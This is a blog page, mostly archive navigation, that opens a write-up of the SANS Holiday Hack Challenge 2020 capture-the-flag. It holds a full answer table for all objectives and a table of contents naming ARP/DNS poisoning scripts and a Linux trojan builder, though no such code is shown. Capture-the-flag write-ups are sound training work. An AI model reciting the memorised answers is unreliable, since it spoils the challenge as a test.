    <a href="../../../2014/01/2014-01-23-maximum-connection-exceeded-how-to-know-who-are-logged-on-to-a-server-and-not-letting-you-in/" class="dropdown-item">Maximum connections exceeded!!!! - How to know who are logged on to a server and not letting you in?</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2014 01 30 sql server job cannot insert the value null into column owner sid table msdb dbo sysjobs</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2014/01/2014-01-30-sql-server-job-cannot-insert-the-value-null-into-column-owner_sid-table-msdb-dbo-sysjobs/" class="dropdown-item">Sql Server job - Cannot insert the value NULL into column &lsquo;owner_sid&rsquo;, table &lsquo;msdb.dbo.sysjobs&rsquo;</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">02</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2014 02 03 tibco businessworks bw jdbc 100034 configuration test failed exception com microsoft sqlserver jdbc sqlserverexception occurred com microsoft sqlserver jdbc sqlserverexception connection</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2014/02/2014-02-03-tibco-businessworks-bw-jdbc-100034-configuration-test-failed-exception-com-microsoft-sqlserver-jdbc-sqlserverexception-occurred-com-microsoft-sqlserver-jdbc-sqlserverexception-connection/" class="dropdown-item">Tibco BusinessWorks - BW-JDBC-100034 &quot;Configuration Test Failed. Exception [com.microsoft.sqlserver.jdbc.SQLServerException] occurred. com.microsoft.sqlserver.jdbc.SQLServerException: Connection reset</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2014 02 25 unable to deploy tibco bw application after configuring tibco bw process monitor error tra 000000 streamgobblererror data java lang noclassdeffounderror comtibcoprocessmonitorclient</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2014/02/2014-02-25-unable-to-deploy-tibco-bw-application-after-configuring-tibco-bw-process-monitor-error-tra-000000-streamgobblererror-data-java-lang-noclassdeffounderror-comtibcoprocessmonitorclient/" class="dropdown-item">Unable to deploy Tibco BW application after configuring  Tibco BW Process Monitor  - ERROR -  [TRA-000000] StreamGobbler(ERROR) : data = java.lang.NoClassDefFoundError: com/tibco/processmonitor/client/run Caused by: java.lang.ClassNotFoundException: com.tibco.processmonitor.client.run</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2014 02 28 tibco cloud bus a sneak peek</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2014/02/2014-02-28-tibco-cloud-bus-a-sneak-peek/" class="dropdown-item">TIBCO Cloud Bus &ndash; At a glance and more&hellip;.</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">03</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2014 03 12 tibco businessworks bw jdbc 100034 configuration test failed exception com microsoft sqlserver jdbc sqlserverexception occurred com microsoft sqlserver jdbc sqlserverexception connection 2</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2014/03/2014-03-12-tibco-businessworks-bw-jdbc-100034-configuration-test-failed-exception-com-microsoft-sqlserver-jdbc-sqlserverexception-occurred-com-microsoft-sqlserver-jdbc-sqlserverexception-connection-2/" class="dropdown-item">Tibco BusinessWorks - BW-JDBC-100034 &quot;Configuration Test Failed. Exception [com.microsoft.sqlserver.jdbc.SQLServerException] occurred. com.microsoft.sqlserver.jdbc.SQLServerException: Connection reset</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">04</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2014 04 08 tibco businessevents 5 1 studio jms test connection failed</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2014/04/2014-04-08-tibco-businessevents-5-1-studio-jms-test-connection-failed/" class="dropdown-item">TIBCO BusinessEvents 5.1 Studio&ndash; JMS Test connection failed</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2014 04 11 tibco businessworks 6 0 release announcement</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2014/04/2014-04-11-tibco-businessworks-6-0-release-announcement/" class="dropdown-item">TIBCO BusinessWorks 6.0 release announcement</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">05</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2014 05 05 sql injection dynamic sql with in clause and quotename</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2014/05/2014-05-05-sql-injection-dynamic-sql-with-in-clause-and-quotename/" class="dropdown-item">Minimizing SQL Injection - Dynamic SQL with IN Clause and QUOTENAME()</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                </ul>
                            </li>
                            <li class="dropdown">
                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">2015 <b class="caret"></b></a>
                                <ul class="dropdown-menu">
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">09</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2015 09 07 developing and configuring a custom password credential validator pcv for pingfederate</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2015/09/2015-09-07-developing-and-configuring-a-custom-password-credential-validator-pcv-for-pingfederate/" class="dropdown-item">Developing and configuring a custom password credential validator [PCV] for PingFederate</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                </ul>
                            </li>
                            <li class="dropdown">
                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">2016 <b class="caret"></b></a>
                                <ul class="dropdown-menu">
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">04</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2016 04 22 pingfederate include complex payload in a saml assertion</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2016/04/2016-04-22-pingfederate-include-complex-payload-in-a-saml-assertion/" class="dropdown-item">PingFederate : Include a complex payload in the SAML assertion</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">07</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2016 07 15 changing from tls v1 0 to tls v1 2 from a tomcat java 7 app</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2016/07/2016-07-15-changing-from-tls-v1-0-to-tls-v1-2-from-a-tomcat-java-7-app/" class="dropdown-item">Changing from TLS v1.0 to TLS v1.2 from a Tomcat Java 7 app</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">08</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2016 08 15 sp initiated single sign on using saml 2 0architecture and a simple implementation 2</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2016/08/2016-08-15-sp-initiated-single-sign-on-using-saml-2-0architecture-and-a-simple-implementation-2/" class="dropdown-item">SP-Initiated Single Sign On using SAML 2.0&ndash;Architecture and a simple implementation</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">09</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2016 09 29 powershell transcription and script bulk logging</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2016/09/2016-09-29-powershell-transcription-and-script-bulk-logging/" class="dropdown-item">PowerShell Transcription and script bulk logging</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">10</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2016 10 25 f5 irules setting the httponly flag on a http cookie</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2016/10/2016-10-25-f5-irules-setting-the-httponly-flag-on-a-http-cookie/" class="dropdown-item">F5 iRules : Setting the HttpOnly flag on a HTTP cookie</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                </ul>
                            </li>
                            <li class="dropdown">
                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">2017 <b class="caret"></b></a>
                                <ul class="dropdown-menu">
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">06</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2017 06 10 gcih certification</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2017/06/2017-06-10-gcih-certification/" class="dropdown-item">GCIH Certification</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                </ul>
                            </li>
                            <li class="dropdown">
                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">2018 <b class="caret"></b></a>
                                <ul class="dropdown-menu">
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">02</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2018 02 05 won the challenge coin sans for500 windows forensics analysis</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2018/02/2018-02-05-won-the-challenge-coin-sans-for500-windows-forensics-analysis/" class="dropdown-item">Won the challenge coin! SANS FOR500 &ndash; Windows Forensics Analysis</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">07</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2018 07 04 compromising a azure windows 2008 r2 sp1 vm</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2018/07/2018-07-04-compromising-a-azure-windows-2008-r2-sp1-vm/" class="dropdown-item">Compromising an Azure Windows 2008 R2 SP1 VM</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                </ul>
                            </li>
                            <li class="dropdown">
                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">2019 <b class="caret"></b></a>
                                <ul class="dropdown-menu">
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">02</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2019 02 17 identify critical assets in your environment using f5 load balancer</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2019/02/2019-02-17-identify-critical-assets-in-your-environment-using-f5-load-balancer/" class="dropdown-item">Identify Critical Assets in your environment using F5 Load balancer</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">06</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2019 06 05 azure sentinel preview detecting brute force rdp attempts</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2019/06/2019-06-05-azure-sentinel-preview-detecting-brute-force-rdp-attempts/" class="dropdown-item">Azure Sentinel &ndash; Detecting brute force RDP attempts</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                </ul>
                            </li>
                            <li class="dropdown">
                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">2020 <b class="caret"></b></a>
                                <ul class="dropdown-menu">
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">01</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2020 01 22 detection of identity based risks using azure ad identity protection and graph api</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2020/01/2020-01-22-detection-of-identity-based-risks-using-azure-ad-identity-protection-and-graph-api/" class="dropdown-item">Detection of identity-based risks using Azure AD Identity Protection and Graph API</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">12</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2020 12 02 azure policy deny creation of virtual machines without ip restriction across all azure subscriptions</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="../../../2020/12/2020-12-02-azure-policy-deny-creation-of-virtual-machines-without-ip-restriction-across-all-azure-subscriptions/" class="dropdown-item">Azure Policy &ndash; Deny creation of virtual machines without IP restriction across all Azure subscriptions</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                </ul>
                            </li>
                            <li class="dropdown active">
                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">2021 <b class="caret"></b></a>
                                <ul class="dropdown-menu">
                                    
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">01</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#" class="dropdown-item">2021 01 17 sans holiday hack challenge 2020 kringlecon 3 write up</a>
    <ul class="dropdown-menu">
            
<li>
    <a href="./" class="dropdown-item active">SANS Holiday Hack Challenge 2020 (KringleCon 3) Write-up</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                </ul>
                            </li>
                        </ul>

                    <ul class="nav navbar-nav ml-auto">
                        <li class="nav-item">
                            <a href="#" class="nav-link" data-toggle="modal" data-target="#mkdocs_search_modal">
                                <i class="fa fa-search"></i> Search
                            </a>
                        </li>
                            <li class="nav-item">
                                <a rel="prev" href="../../../2020/12/2020-12-02-azure-policy-deny-creation-of-virtual-machines-without-ip-restriction-across-all-azure-subscriptions/" class="nav-link">
                                    <i class="fa fa-arrow-left"></i> Previous
                                </a>
                            </li>
                            <li class="nav-item">
                                <a rel="next" class="nav-link disabled">
                                    Next <i class="fa fa-arrow-right"></i>
                                </a>
                            </li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="container">
            <div class="row">
                    <div class="col-md-3"><div class="navbar-light navbar-expand-md bs-sidebar hidden-print affix" role="complementary">
    <div class="navbar-header">
        <button type="button" class="navbar-toggler collapsed" data-toggle="collapse" data-target="#toc-collapse" title="Table of Contents">
            <span class="fa fa-angle-down"></span>
        </button>
    </div>

    
    <div id="toc-collapse" class="navbar-collapse collapse card bg-secondary">
        <ul class="nav flex-column">
            
            <li class="nav-item" data-level="1"><a href="#sans-holiday-hack-challenge-2020-kringlecon-3-write-up" class="nav-link">SANS Holiday Hack Challenge 2020 (KringleCon 3) Write-up</a>
              <ul class="nav flex-column">
            <li class="nav-item" data-level="2"><a href="#all-answers" class="nav-link">All Answers</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            <li class="nav-item" data-level="2"><a href="#objective-1-uncover-santas-gift-list" class="nav-link">Objective 1 : Uncover Santa's Gift List</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            <li class="nav-item" data-level="2"><a href="#unwirled-image-to-find-the-item" class="nav-link">Unwirled Image to find the item :</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            <li class="nav-item" data-level="2"><a href="#objective-2-investigate-the-s3-bucket" class="nav-link">Objective 2: Investigate the S3 bucket</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            <li class="nav-item" data-level="2"><a href="#objective-3-point-of-sale-password-recovery" class="nav-link">Objective 3: Point-of-sale Password Recovery</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            <li class="nav-item" data-level="2"><a href="#objective-4-operate-the-santavator" class="nav-link">Objective 4: Operate the Santavator</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            <li class="nav-item" data-level="2"><a href="#objective-5-open-hid-block" class="nav-link">Objective 5 : Open HID Block</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            <li class="nav-item" data-level="2"><a href="#objective-6-splunk-challenge" class="nav-link">Objective 6: Splunk Challenge</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            <li class="nav-item" data-level="2"><a href="#output_1" class="nav-link">Output :</a>
              <ul class="nav flex-column">
              </ul>
            </li>
              </ul>
            </li>
            
            <li class="nav-item" data-level="1"><a href="#the-splunk-challenge-question" class="nav-link">The Splunk challenge question :</a>
              <ul class="nav flex-column">
            <li class="nav-item" data-level="2"><a href="#answer-the-lollipop-guild" class="nav-link">Answer : The Lollipop Guild</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            <li class="nav-item" data-level="2"><a href="#process_11" class="nav-link">Process :</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            <li class="nav-item" data-level="2"><a href="#find-answer-using-all-the-hints" class="nav-link">Find answer using all the hints:</a>
              <ul class="nav flex-column">
              </ul>
            </li>
              </ul>
            </li>
            
            <li class="nav-item" data-level="1"><a href="#can-bus-problem" class="nav-link">CAN Bus Problem</a>
              <ul class="nav flex-column">
            <li class="nav-item" data-level="2"><a href="#answer-122520" class="nav-link">Answer : 122520</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            <li class="nav-item" data-level="2"><a href="#process_12" class="nav-link">Process :</a>
              <ul class="nav flex-column">
              </ul>
            </li>
              </ul>
            </li>
            
            <li class="nav-item" data-level="1"><a href="#objective-7-solve-the-sleighs-can-d-bus-problem" class="nav-link">Objective 7: Solve the Sleigh's CAN-D-BUS Problem</a>
              <ul class="nav flex-column">
            <li class="nav-item" data-level="2"><a href="#process_13" class="nav-link">Process :</a>
              <ul class="nav flex-column">
              </ul>
            </li>
              </ul>
            </li>
            
            <li class="nav-item" data-level="1"><a href="#objective-8-broken-tag-generator" class="nav-link">Objective 8: Broken Tag Generator</a>
              <ul class="nav flex-column">
            <li class="nav-item" data-level="2"><a href="#answer-jackfrostwashere" class="nav-link">Answer : JackFrostWasHere</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            <li class="nav-item" data-level="2"><a href="#high-level-approach" class="nav-link">High level Approach:</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            <li class="nav-item" data-level="2"><a href="#process_14" class="nav-link">Process :</a>
              <ul class="nav flex-column">
              </ul>
            </li>
              </ul>
            </li>
            
            <li class="nav-item" data-level="1"><a href="#objective-9-arp-shenanigans" class="nav-link">Objective 9: ARP Shenanigans</a>
              <ul class="nav flex-column">
            <li class="nav-item" data-level="2"><a href="#answer-tanta-kringle" class="nav-link">Answer : Tanta Kringle</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            <li class="nav-item" data-level="2"><a href="#high-level-approach_1" class="nav-link">High level approach :</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            <li class="nav-item" data-level="2"><a href="#the-process" class="nav-link">The Process :</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            <li class="nav-item" data-level="2"><a href="#putting-it-all-together" class="nav-link">Putting it all together :</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            <li class="nav-item" data-level="2"><a href="#arp_resppy-with-changes-for-arp-poisoning" class="nav-link">arp_resp.py (with changes) for ARP poisoning</a>
              <ul class="nav flex-column">
              </ul>
            </li>
              </ul>
            </li>
            
            <li class="nav-item" data-level="1"><a href="#usrbinpython3" class="nav-link">!/usr/bin/python3</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            
            <li class="nav-item" data-level="1"><a href="#our-eth0-ip" class="nav-link">Our eth0 ip</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            
            <li class="nav-item" data-level="1"><a href="#our-eth0-mac-address" class="nav-link">Our eth0 mac address</a>
              <ul class="nav flex-column">
            <li class="nav-item" data-level="2"><a href="#dns_resp-with-changes-for-dns-poisoning" class="nav-link">dns_resp (with changes) for DNS poisoning :</a>
              <ul class="nav flex-column">
              </ul>
            </li>
              </ul>
            </li>
            
            <li class="nav-item" data-level="1"><a href="#usrbinpython3_1" class="nav-link">!/usr/bin/python3</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            
            <li class="nav-item" data-level="1"><a href="#our-eth0-ip_1" class="nav-link">Our eth0 IP</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            
            <li class="nav-item" data-level="1"><a href="#our-mac-addr" class="nav-link">Our Mac Addr</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            
            <li class="nav-item" data-level="1"><a href="#destination-ip-we-arp-spoofed" class="nav-link">destination ip we arp spoofed</a>
              <ul class="nav flex-column">
            <li class="nav-item" data-level="2"><a href="#build_linux_trojansh-to-create-a-linux-trojan-with-a-deb-file" class="nav-link">build_linux_trojan.sh [to create a Linux trojan with a .deb file]</a>
              <ul class="nav flex-column">
              </ul>
            </li>
              </ul>
            </li>
            
            <li class="nav-item" data-level="1"><a href="#binbash" class="nav-link">!/bin/bash</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            
            <li class="nav-item" data-level="1"><a href="#objective-10-defeat-fingerprint-sensor" class="nav-link">Objective 10: Defeat Fingerprint Sensor</a>
              <ul class="nav flex-column">
            <li class="nav-item" data-level="2"><a href="#high-level-details" class="nav-link">High level details :</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            <li class="nav-item" data-level="2"><a href="#process_15" class="nav-link">Process :</a>
              <ul class="nav flex-column">
              </ul>
            </li>
              </ul>
            </li>
            
            <li class="nav-item" data-level="1"><a href="#objective-11a-naughtynice-list-with-blockchain-investigation-part-1" class="nav-link">Objective 11a): Naughty/Nice List with Blockchain Investigation Part 1</a>
              <ul class="nav flex-column">
            <li class="nav-item" data-level="2"><a href="#answer-57066318f32f729d" class="nav-link">Answer : 57066318F32F729D</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            <li class="nav-item" data-level="2"><a href="#high-level-approach_2" class="nav-link">High-level approach :</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            <li class="nav-item" data-level="2"><a href="#details" class="nav-link">Details :</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            <li class="nav-item" data-level="2"><a href="#the-below-zip-file-contains-the-changed-naughty_nicepy-please-remove-the-txt-after-extraction" class="nav-link">The below zip file contains the changed naughty_nice.py (please remove the .txt after extraction)</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            <li class="nav-item" data-level="2"><a href="#naughty_nicepy" class="nav-link">naughty_nice.py</a>
              <ul class="nav flex-column">
              </ul>
            </li>
              </ul>
            </li>
            
            <li class="nav-item" data-level="1"><a href="#the-snowball-fight" class="nav-link">The snowball fight :</a>
              <ul class="nav flex-column">
            <li class="nav-item" data-level="2"><a href="#high-level-approach_3" class="nav-link">High level Approach :</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            <li class="nav-item" data-level="2"><a href="#process-details" class="nav-link">Process details :</a>
              <ul class="nav flex-column">
              </ul>
            </li>
              </ul>
            </li>
            
            <li class="nav-item" data-level="1"><a href="#binbash_1" class="nav-link">!/bin/bash</a>
              <ul class="nav flex-column">
            <li class="nav-item" data-level="2"><a href="#new-hints-unlocked" class="nav-link">New hints unlocked!!</a>
              <ul class="nav flex-column">
              </ul>
            </li>
              </ul>
            </li>
            
            <li class="nav-item" data-level="1"><a href="#objective-11b-naughtynice-list-with-blockchain-investigation-part-2" class="nav-link">Objective 11b): Naughty/Nice List with Blockchain Investigation Part 2</a>
              <ul class="nav flex-column">
            <li class="nav-item" data-level="2"><a href="#answer-fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb" class="nav-link">Answer: fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            <li class="nav-item" data-level="2"><a href="#high-level-approach_4" class="nav-link">High level approach :</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            <li class="nav-item" data-level="2"><a href="#process_16" class="nav-link">Process :</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            <li class="nav-item" data-level="2"><a href="#the-whole-naughty_nicepy" class="nav-link">The whole naughty_nice.py</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            <li class="nav-item" data-level="2"><a href="#determine-and-extract-the-original-naughty-document" class="nav-link">Determine and extract the original naughty document:</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            <li class="nav-item" data-level="2"><a href="#determine-the-flag-for-naughtynice-in-the-jacks-block" class="nav-link">Determine the flag for naughty/nice in the Jack’s block :</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            <li class="nav-item" data-level="2"><a href="#determine-3rd-and-4th-byte-which-were-changed-by-jake" class="nav-link">Determine 3rd and 4th byte which were changed by Jake :</a>
              <ul class="nav flex-column">
              </ul>
            </li>
              </ul>
            </li>
            
            <li class="nav-item" data-level="1"><a href="#all-objectives-are-completed-now" class="nav-link">All objectives are completed now</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            
            <li class="nav-item" data-level="1"><a href="#all-narratives-have-been-unlocked" class="nav-link">All narratives have been unlocked</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            
            <li class="nav-item" data-level="1"><a href="#the-best-part" class="nav-link">The best part!</a>
              <ul class="nav flex-column">
              </ul>
            </li>
            
            <li class="nav-item" data-level="1"><a href="#the-exclusive-winner-hoodie" class="nav-link">The exclusive winner hoodie :</a>
              <ul class="nav flex-column">
              </ul>
            </li>
        </ul>
    </div>
</div></div>
                    <div class="col-md-9" role="main">

<h1 id="sans-holiday-hack-challenge-2020-kringlecon-3-write-up">SANS Holiday Hack Challenge 2020 (KringleCon 3) Write-up</h1>
<p>Holiday Hack Challenge is a CTF challenge organized by <a href="https://www.sans.org/">SANS</a> and <a href="https://www.counterhackchallenges.com/">Counter Hack</a> during Christmas each year. This year the CTF was named “KringleCon 3: French Hens”. It had total 12 objectives and 12 terminals.<br />
Those 12 objectives tested hacking skillsets using Python, Javascript, Network security, Cryptography etc.<br />
As you progressed, the difficulty level of the objectives increased.<br />
It was a mind-numbing and awesome experience to complete all those objectives.<br />
Below is the write-up of those objectives including the answers.</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-99.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-99.png?w=762" /></a></p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/the-2020-sans-holiday-hack-challenge.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/the-2020-sans-holiday-hack-challenge.png?w=555" /></a></p>
<h2 id="all-answers">All Answers</h2>
<table>
<thead>
<tr>
<th>Objective</th>
<th>Answer</th>
</tr>
</thead>
<tbody>
<tr>
<td>Objective 1: Uncover Santa’s Gift List</td>
<td>Proxmark</td>
</tr>
<tr>
<td>Objective 2: Investigate the S3 bucket</td>
<td>North Pole: The Frostiest Place on Earth</td>
</tr>
<tr>
<td>Objective 3: Point-of-sale Password Recovery</td>
<td>santapass</td>
</tr>
<tr>
<td>Objective 4: Operate the Santavator</td>
<td>No answer.</td>
</tr>
<tr>
<td>This needed to be solved using Javascript by manipulating the position of objects.</td>
<td></td>
</tr>
<tr>
<td>Objective 5 : Open HID Block</td>
<td>No answer.</td>
</tr>
<tr>
<td>This needed to be solved using the Proxmark CLI.</td>
<td></td>
</tr>
<tr>
<td>Objective 6: Splunk Challenge</td>
<td></td>
</tr>
<tr>
<td>Training Question 1</td>
<td>13</td>
</tr>
<tr>
<td>Objective 6: Splunk Challenge</td>
<td></td>
</tr>
<tr>
<td>Training Question 2</td>
<td>t1059.003-main t1059.003-win</td>
</tr>
<tr>
<td>Objective 6: Splunk Challenge</td>
<td></td>
</tr>
<tr>
<td>Training Question 3</td>
<td>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography</td>
</tr>
<tr>
<td>Objective 6: Splunk Challenge</td>
<td></td>
</tr>
<tr>
<td>Training Question 4</td>
<td>2020-11-30T17:44:15Z</td>
</tr>
<tr>
<td>Objective 6: Splunk Challenge</td>
<td></td>
</tr>
<tr>
<td>Training Question 5</td>
<td>3648</td>
</tr>
<tr>
<td>Objective 6: Splunk Challenge</td>
<td></td>
</tr>
<tr>
<td>Training Question 6</td>
<td>quser</td>
</tr>
<tr>
<td>Objective 6: Splunk Challenge</td>
<td></td>
</tr>
<tr>
<td>Training Question 7</td>
<td>55FCEEBB21270D9249E86F4B9DC7AA60</td>
</tr>
<tr>
<td>Objective 6: Splunk Challenge</td>
<td></td>
</tr>
<tr>
<td>The challenge question</td>
<td>The Lollipop Guild</td>
</tr>
<tr>
<td>CAN Bus Problem</td>
<td></td>
</tr>
<tr>
<td>This is was the prerequisite for</td>
<td></td>
</tr>
<tr>
<td>Objective 7 : Solve the Sleigh’s CAN-D-BUS Problem</td>
<td>122520</td>
</tr>
<tr>
<td>Objective 8: Broken Tag Generator</td>
<td>JackFrostWasHere</td>
</tr>
<tr>
<td>Objective 9: ARP Shenanigans</td>
<td>Tanta Kringle</td>
</tr>
<tr>
<td>Objective 10: Defeat Fingerprint Sensor</td>
<td>No answer.</td>
</tr>
<tr>
<td>This needed bypassing the "Santa" check using Javascript and Fiddler</td>
<td></td>
</tr>
<tr>
<td>Objective 11a): Naughty/Nice List with Blockchain Investigation Part</td>
<td>57066318F32F729D</td>
</tr>
<tr>
<td>Objective 11b): Naughty/Nice List with Blockchain Investigation Part 2</td>
<td>fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<h2 id="objective-1-uncover-santas-gift-list">Objective 1 : Uncover Santa's Gift List</h2>
<p>There is a photo of Santa's Desk on that billboard with his personal gift list. What gift is Santa planning on getting Josh Wright for the holidays? Talk to Jingle Ringford at the bottom of the mountain for advice.</p>
<h3 id="answer">Answer</h3>
<p>Proxmark</p>
<h3 id="process">Process</h3>
<p>1) Downloaded the photograph.<br />
2) Cropped the photo with only the gift list.<br />
3) Installed Gimp<br />
4) Used Filter &gt; Distort &gt; Whirl and Pinch<br />
